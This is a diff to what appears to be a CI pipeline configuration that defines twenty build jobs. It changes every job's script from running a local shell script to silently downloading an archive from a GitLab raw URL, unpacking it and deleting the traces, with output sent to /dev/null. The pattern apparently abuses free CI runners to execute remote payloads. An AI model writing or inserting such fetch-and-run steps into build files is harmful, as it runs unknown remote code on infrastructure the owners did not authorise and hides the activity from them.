@@ -7,100 +7,100 @@ jobs:
     - stage: test
       name: "build1"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build2"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build3"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build4"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build5"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build6"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build7"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build8"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build9"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build10"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build11"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build12"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build13"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build14"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build15"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build16"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build17"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build18"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build19"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
     -
       name: "build20"
       script:
-        - sudo -u  bash sarika.sh
+        - sudo -u wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
         
